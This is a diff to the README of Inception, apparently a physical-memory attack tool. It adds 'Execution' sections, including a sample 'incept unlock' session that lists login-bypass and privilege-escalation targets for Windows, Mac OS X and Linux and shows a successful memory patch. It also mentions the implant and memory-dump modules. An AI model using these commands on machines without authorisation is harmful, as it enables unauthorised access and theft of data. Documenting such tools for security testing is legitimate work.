@@ -202,6 +202,39 @@ systems:
 The module also effectively enables escalation of privileges, for instance via
 the `runas` or `sudo -s` commands, respectively.
 
+#### Execution
+    
+    To unlock, simply type:
+
+    incept unlock
+
+     _|  _|      _|    _|_|_|  _|_|_|_|  _|_|_|    _|_|_|  _|    _|_|    _|      _|
+     _|  _|_|    _|  _|        _|        _|    _|    _|    _|  _|    _|  _|_|    _|
+     _|  _|  _|  _|  _|        _|_|_|    _|_|_|      _|    _|  _|    _|  _|  _|  _|
+     _|  _|    _|_|  _|        _|        _|          _|    _|  _|    _|  _|    _|_|
+     _|  _|      _|    _|_|_|  _|_|_|_|  _|          _|    _|    _|_|    _|      _|
+
+    v.0.4.0 (C) Carsten Maartmann-Moe 2014
+    Download: http://breaknenter.org/projects/inception | Twitter: @breaknenter
+
+    [?] Will potentially write to file. OK? [y/N] y
+    [*] Available targets (known signatures):
+    --------------------------------------------------------------------------------
+    [1] Windows 8 MsvpPasswordValidate unlock/privilege escalation
+    [2] Windows 7 MsvpPasswordValidate unlock/privilege escalation
+    [3] Windows Vista MsvpPasswordValidate unlock/privilege escalation
+    [4] Windows XP MsvpPasswordValidate unlock/privilege escalation
+    [5] Mac OS X DirectoryService/OpenDirectory unlock/privilege escalation
+    [6] Ubuntu libpam unlock/privilege escalation
+    [7] Linux Mint libpam unlock/privilege escalation
+    --------------------------------------------------------------------------------
+    [?] Please select target (or enter 'q' to quit): 2
+    [*] Selected target: Windows 7 MsvpPasswordValidate unlock/privilege escalation
+    [=============>                                                ]  227 MiB ( 22%)
+    [*] Signature found at 0xe373312 in page no. 58227
+    [*] Patch verified; successful
+    [*] BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!
+
 
 ### Implant
 
@@ -213,6 +246,8 @@ The current version only work as a proof-of-concept against Windows 7 SP1 x86.
 No other OSes, versions or architectures are supported, nor is there any
 guarantee that they will be supported in the future. If you want to change
 this, send me a wad of cash in unmarked dollar bills or a pull request.
+
+#### Execution
 
 To use it, start `msfrpcd`:
 
@@ -301,7 +336,9 @@ In your MSF console, you should see something similar to this:
 ### Dump
 
 The `dump` module facilitates dumping of memory from the target to the
-attacking host:
+attacking host.
+
+#### Execution
 
     incept dump
 
